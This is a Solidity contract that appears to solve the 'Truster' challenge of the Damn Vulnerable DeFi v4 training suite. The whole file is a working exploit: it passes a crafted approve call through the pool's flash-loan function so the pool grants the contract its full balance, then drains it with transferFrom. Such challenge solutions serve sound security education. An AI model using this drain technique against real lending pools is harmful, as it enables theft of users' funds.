// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../src/truster/TrusterLenderPool.sol";
contract Recover {

    DamnValuableToken public immutable token;
    address public immutable pool;

    constructor(address tokenAddress, address poolAddress) {
        token = DamnValuableToken(tokenAddress);
        pool = poolAddress;
    }

    function recoverTokens(address recoveryAddress) external {
        uint256 amount = token.balanceOf(pool);
        //since the pool uses address.functionCall, we can craft any call we want
        //we can force it to call approve on the token contract, approving us to spend the pool's tokens
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        
        TrusterLenderPool(pool).flashLoan(0, address(this), address(token), data);
        
        token.transferFrom(pool, recoveryAddress, amount);  
    }
}